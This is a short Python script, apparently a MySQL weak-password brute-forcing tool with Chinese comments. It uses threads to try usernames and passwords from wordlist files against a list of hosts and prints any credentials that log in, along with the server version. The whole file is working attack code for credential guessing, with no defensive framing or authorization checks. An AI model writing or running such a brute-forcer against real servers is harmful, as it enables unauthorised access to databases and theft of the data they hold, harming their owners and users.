#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""  
@Project : python
@File : mysql_burte.py
@Author : moresuo
@Time : 2026/6/26 15:29  
@脚本说明 : mysql弱密码爆破
"""
import ipaddress
import pymysql
import concurrent.futures

#连接MySQL
def scan_mysql(ip="127.0.0.1",port=3306,user="root",password="",connect_timeout=5):
    try:
        conn=pymysql.connect(
            host=ip,
            port=port,
            user=user,
            password=password,
            connect_timeout=connect_timeout,
            charset="utf8",
            database="information_schema",
            autocommit=True
        )
        if conn:
            cursor=conn.cursor()
            print(f"[+] {ip}:{port}存在弱口令,弱口令:{user}/{password},版本:{cursor.connection.get_server_info()}")
            cursor.close()
        conn.close()
    except:
        pass

#线程池执行任务
def scan_mysql_run_file(hosts,userpath,pwdpath,port,threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for ip in hosts:
            #读取用户密码文件
            with open(file=userpath,mode="r",encoding="utf-8") as users:
                for user in users:
                    with open(file=pwdpath,mode="r",encoding="utf-8") as passwords:
                        for pwd in passwords:
                            executor.submit(scan_mysql,ip=ip,port=port,user=user.strip(),password=pwd.strip())

#指定用户名
def scan_mysql_run(hosts,username,password,port,threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for ip in hosts:
            with open(file=password,mode="r",encoding="utf-8") as passwords:
                for pwd in passwords:
                    executor.submit(scan_mysql,ip,port,username,pwd.strip())


